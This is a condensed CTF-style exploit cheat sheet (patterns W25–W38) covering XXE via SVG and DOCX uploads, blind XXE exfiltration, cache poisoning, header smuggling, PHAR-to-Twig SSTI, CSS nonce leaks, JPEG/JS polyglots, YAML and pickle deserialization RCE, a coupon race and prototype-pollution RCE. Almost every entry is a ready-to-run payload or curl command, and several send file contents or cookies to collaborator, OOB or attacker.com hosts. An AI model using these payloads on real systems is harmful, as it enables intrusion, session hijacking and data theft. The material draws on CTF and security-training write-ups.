# Writeup-Distilled Patterns W25–W38 — XXE / cache / smuggle / CSP / polyglot / race / PP-RCE

## W25 — SVG-upload XXE (+PNG pipeline)
Signals: seller/avatar SVG upload, caption reflects SVG text, `lxml` with `resolve_entities=True`, PNG conversion via svglib.
Steps: 1) upload benign SVG; 2) `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in `<title>&xxe;</title>`; 3) read caption; 4) escalate to `php://filter/convert.base64-encode` for source.
```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title></svg>
```
Pitfalls: rasterizer may strip entities — reference inside rendered `<text>`; external-network off kills OOB — prefer inline reflect first.
Sources: https://github.com/ruthwikchikoti/Application-Security-End-Term-CTF/blob/main/writeup-5q.md | https://github.com/George0Papasotiriou/CVE-2026-11112-XXE-via-SVG-Image-Upload | https://github.com/ljagiello/ctf-skills/blob/main/ctf-web/server-side-2.md

## W26 — DOCX `[Content_Types].xml` XXE
Signals: `.docx/.xlsx` upload, ZIP+XML backend, error reflects base64 or part names.
Steps: 1) `unzip doc.docx`; 2) inject XXE into `[Content_Types].xml` `<Override PartName="/hack" ContentType="&xxe;"/>`; 3) rezip, `curl -F file=@exploit.docx`.
```bash
unzip -q doc.docx -d d && python3 - <<'PY'
open('d/[Content_Types].xml','w').write('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/hack" ContentType="&xxe;"/></Types>')
PY
(cd d && zip -qr ../exploit.docx .) && curl -sS -F file=@exploit.docx $URL/upload
```
Pitfalls: must rezip with same structure; parser may read only first part — `[Content_Types]` is read first, use it.
Sources: https://github.com/ljagiello/ctf-skills/blob/main/ctf-web/server-side-2.md | https://payloadplayground.com/blog/xxe-injection-exploitation-complete-guide

## W27 — Blind XXE external-DTD b64 exfil
Signals: `stockCheck`-style XML, no reflection, regular entities blocked but `% param` allowed, collaborator allowed.
Steps: 1) host `evil.dtd`: `% file` (php-filter b64) + `% eval` + `% exfil` to collaborator `?x=%file;`; 2) send `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://<exploit>/evil.dtd"> %xxe;]>`; 3) poll collaborator, decode b64.
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://<collab>/?x=%file;'>">
%eval; %exfil;
```
Pitfalls: multi-line files break URL — b64 first; `/etc/passwd` newlines need FTP, use `/etc/hostname` to test flow.
Sources: https://ctftime.org/writeup/39579 | https://hackmd.io/@SBK6401/S137CKUEh | https://jadu101.github.io/Web_App/M-Web-Attacks%E2%9A%94%EF%B8%8F/XXE/d-Blind-Data-Exfiltration

## W28 — Host-header reset/cache poisoning (CTFd-class)
Signals: CTFd/Flask reset links built from `Host`, nginx without `server_name`, cache keys ignore `Host`.
Steps: 1) `curl -H 'Host: attacker.com' $URL/reset -d 'email=victim'`; 2) check email/cache for `https://attacker.com/reset...`; 3) for cache: `curl -H 'X-Forwarded-Host: evil<cid>' $URL/?cb=<r1>` → MISS reflect, then `GET /` HIT persist?
```bash
curl -sS -X POST $URL/reset -H 'Host: attacker.com' -d 'email=victim@x.y' -D -
curl -sS "$URL/?cb=<r1>" -H 'X-Forwarded-Host: evil<cid>' -D - | grep -iE 'x-cache|age|evil'
```
Pitfalls: needs victim click for reset — reportability needs interaction; cache needs `Age` growth proof, not just reflect.
Sources: https://www.sentinelone.com/vulnerability-database/cve-2025-23001 | https://github.com/cel1s0/offsec-notes/blob/base/portswigger-academy/advanced-topics/web-cache-poisoning.md

## W29 — Varnish `/imgs` cache-key session poison
Signals: Varnish `v.vcl` caches only URLs with `/imgs`, `Set-Cookie` cache line commented out, `missioninfo/<name>` expands to `/api/missioninfo/imgs..`.
Steps: 1) create mission `name=imgs<RAND>`; 2) `GET /api/missioninfo/imgs<RAND>` to prime cache with your session JSON; 3) checker fetch hits poisoned entry → session hijack.
```bash
curl -sS -X POST $URL/api/create -H "Host: $HOST" -d '{"name":"imgsABC123","short":"x"}'
curl -sS "http://$HOST/api/missioninfo/imgsABC123" -H "Host: $HOST" -D - | grep -iE 'age|x-cache'
```
Pitfalls: only GET/HEAD cached — POST priming fails; Host is part of `vcl_hash` — pin it; TTL short — time checker window.
Sources: https://ctftime.org/writeup/39632 | https://github.com/boxgramer/writeup/blob/main/writeup-20250427.md

## W30 — Next.js Server-Action SSRF (CVE-2024-34351)
Signals: Next.js + `logout` with `Next-Action: <id>` header, python `Python/3.11` urllib errors, `/internal` fuzz hit.
Steps: 1) grab `Next-Action` from logout network tab; 2) attacker server: HEAD→`200 Content-Type: text/x-component`, GET→`302` to `http://169.254.169.254/...`; 3) `curl -H 'Next-Action: <id>' -H 'Content-Type: application/json' --data '{}' $URL/logout`.
```bash
curl -sS "$URL/logout" -H 'Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de' -H 'Content-Type: application/json' --data '{}'
```
Pitfalls: needs exact action ID per build; HEAD/GET roles swapped = no SSRF; urllib whitespace bypass (` http://...`) is separate CVE-2023-24329 — don't conflate.
Sources: https://ctftime.org/writeup/39295 | https://github.com/Samik081/ctf-writeups/blob/master/UIUCTF%202024/web/log_action.md | https://siunam321.github.io/ctf/UIUCTF-2024

## W31 — `%0a` header-split smuggle to guarded endpoint
Signals: proxy builds backend headers from `?token=`, only checks `\r\n` not lone `\n`, `/flag` proxies to backend `/flag`, `/add-token` needs auth.
Steps: 1) `GET /flag?token=%0aContent-Length:0%0aConnection:%20keep-alive%0a%0aGET%20/add-token?token=RAND...`; 2) `GET /flag?token=RAND`.
```bash
curl -sS "$URL/flag?token=%0aContent-Length:0%0aConnection:%20keep-alive%0a%0aGET%20/add-token?token=RAND123%20HTTP/1.0%0aHost:%20back:8080%0a"
curl -sS "$URL/flag?token=RAND123"
```
Pitfalls: `%0d%0a` fails the naive check-bypass — use lone `%0a`; keep-alive required or second request never parses.
Sources: https://ctftime.org/writeup/35398 | https://github.com/M1SD4Q/Portswigger-Writeups/blob/main/Web%20Application%20Security/8%20HTTP%20REQUEST%20SMUGGLING/8%201%20HRS%20LABS%2030b146b3c43680a18d1ccfc2298e3293.md

## W32 — Twig-deser hybrid (PHAR metadata → SSTI exec)
Signals: avatar upload + `avatar.php?avatar=`, `/cgi-bin` index with `Blog.php`/`CustomTemplate.php` (+`~` backups), `file_exists($lockFilePath)`, Twig present.
Steps: 1) fetch `Blog.php~`; 2) chain `CustomTemplate.template_file_path=Blog(desc=Twig-payload)`; 3) PHAR-JPG polyglot upload; 4) `GET avatar.php?avatar=phar://<name>`.
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```
Pitfalls: `registerUndefinedFilterCallback` is Twig-specific — Jinja payloads fail; `phar://` needs filesystem-function sink, not `include`.
Sources: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain | https://github.com/rafaelchriss/portswigger-labs/blob/master/deserialization/lab-10-phar-deserialization.md

## W33 — CSS `:has()` nonce exfiltration
Signals: CSP `script-src 'nonce-<rand>'` per-request, `style-src 'unsafe-inline'`, HTML injection + admin bot, nonce in `<script nonce=>`.
Steps: 1) inject `<style>body:has(script[nonce^="a"]){background:url(https://$OOB/a)}</style>` per charset; 2) narrow with `*=` substring leaks (`?x=tes&est&sto` overlap-reassemble); 3) final `<script nonce=<leaked>>` cookie exfil.
```html
<style>body:has(script[nonce^="a"]){background:url('https://OOB/a')}</style>
```
Pitfalls: per-request random nonce needs fresh leak per bot visit; `^=` needs 1 req/char — use `*=` substrings; unpkg CSS import may be slow — pre-upload.
Sources: https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md | https://github.com/JosefKuchar/ctf-writeups/blob/master/TSGCTF/BADNONCE_Part_1.md | https://ctftime.org/writeup/36140

## W34 — JPEG/JS polyglot CSP `script-src` bypass
Signals: CSP allows self images as scripts (missing `object-src`/strict `script-src`), contact-form upload checks ext+MIME+dims but not content, XSS can inject `<script src=>`.
Steps: 1) `img_polygloter.py jpg --payload 'fetch(...cookie)' --output poly.jpg`; 2) upload via contact form, note `/uploads/<rand>`; 3) XSS `<script src="/uploads/<rand>">`, wait admin view.
```bash
python3 img_polygloter.py jpg --height 123 --width 321 --payload 'fetch("https://OOB/"+document.cookie)' --output poly.jpg
curl -sS -F image=@poly.jpg $URL/contact
```
Pitfalls: modern browsers block SVG-script — JPEG polyglot still works where SVG fails; random filename must be captured from response.
Sources: https://ctftime.org/writeup/38308 | https://sigflag.at/blog/2023/writeup-glacierctf23-peak/

## W35 — YAML `!!python/object/apply` via base64 path
Signals: URL ends with b64 (`eWFtbDog...` → `yaml: ...`), reflect of decoded YAML, Python `yaml.load` (not safe_load).
Steps: 1) decode tail to confirm `yaml:` prefix; 2) `yaml: !!python/object/apply:subprocess.getoutput ['ls -la']` → b64 → append as path; 3) read flag file same way.
```bash
echo 'eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=' | base64 -d
echo -n 'yaml: !!python/object/apply:subprocess.getoutput ["ls -la"]' | base64 -w0
curl -sS $URL/<b64>
```
Pitfalls: `safe_load` kills it — confirm `yaml.load` via `ls` first; spaces need `${IFS}` only in shell path, not YAML path.
Sources: https://ctftime.org/writeup/39818 | https://cryptocat.me/blog/ctf/2025/tsuku/web/yamlwaf/

## W36 — CherryPy traversal + GIF-pickle session RCE
Signals: CherryPy, register username joins upload path unsanitized (`/app/uploads/<user>`), `filetype.image_match` only checks magic, session via `pickle.load`.
Steps: 1) register `../sessions`; 2) `GIF89a` + pickle `cos system (S'cp /flag /app/public/out.txt' tR.)` named `session-<sid>`; 3) request with that cookie → `GET /static/out.txt`.
```bash
curl -sS -X POST $URL/register -d 'user=../sessions&pass=x'
python3 -c "open('p','wb').write(b'GIF89a\x00\x000'+b\"cos\nsystem\n(S'cp /flag /app/public/out.txt'\ntR.\")"
curl -sS -b session=$S -F file=@p\;filename=session-$S $URL/upload_file
```
Pitfalls: `secure_filename` on download/listing but not upload-join — verify which route writes; session filename ≠ sid format — inspect error.
Sources: https://github.com/wajihhichri-cyber/writeups/blob/main/writeup.md | https://ctftime.org/writeup/40063

## W37 — Coupon TOCTOU race (Rapid-Fire, not Intruder)
Signals: `POST /api/redeem-coupon {"couponCode":"WELCOME50"}`, check-then-act + ~200ms delay, single-use but balance grows.
Steps: 1) confirm single redeem `$100→$150`; 2) skip sequential Intruder (processes serially); 3) single 10-wide simultaneous burst (Rapid-Fire/`xargs -P10`); 4) `GET /api/race-status` verify 10x.
```bash
seq 1 10 | xargs -P10 -I{} curl -sS -X POST $URL/api/redeem-coupon -H 'Content-Type: application/json' -d '{"couponCode":"WELCOME50"}'
```
Pitfalls: sequential replays always show 1 success — concurrency is the bug; >10-wide risks 429 lockout — one burst only.
Sources: https://github.com/Govamarket/Coupon-Redemption | https://ctftime.org/writeup/39337 | https://book.jorianwoltjer.com/binary-exploitation/race-conditions

## W38 — Prototype-pollution `env.PATH` hijack + fake binary
Signals: Node `deepMerge` without key sanitization, `/api/settings` merge + `/export` runs `exec(zip ...)`, `delete baseOpts.env` cleanup (prototype survives).
Steps: 1) `/api/note` plant fake `zip` script in `/app/data/pp`; 2) `POST /api/settings {"exportOptions":{"constructor":{"prototype":{"env":{"PATH":"/app/data/pp"}}}}}`; 3) `GET /export` triggers polluted PATH → fake binary RCE.
```bash
curl -sS -X POST $URL/api/settings -H 'Content-Type: application/json' -d '{"exportOptions":{"constructor":{"prototype":{"env":{"PATH":"/app/data/pp"}}}}}'
curl -sS $URL/export
```
Pitfalls: `delete` only clears own props — prototype pollution persists (don't re-test via own-prop read); Node ≥18.4 `kEmptyObject` blocks no-options spawn — need baseOpts path.
Sources: https://anthr4ce.github.io/ctf-writeups/brunnerctf-2025/web | https://atz1luth.github.io/projects/prototype-pollution-to-rce | https://r3verii.github.io/ctf/2024/04/01/utctf-writeup.html
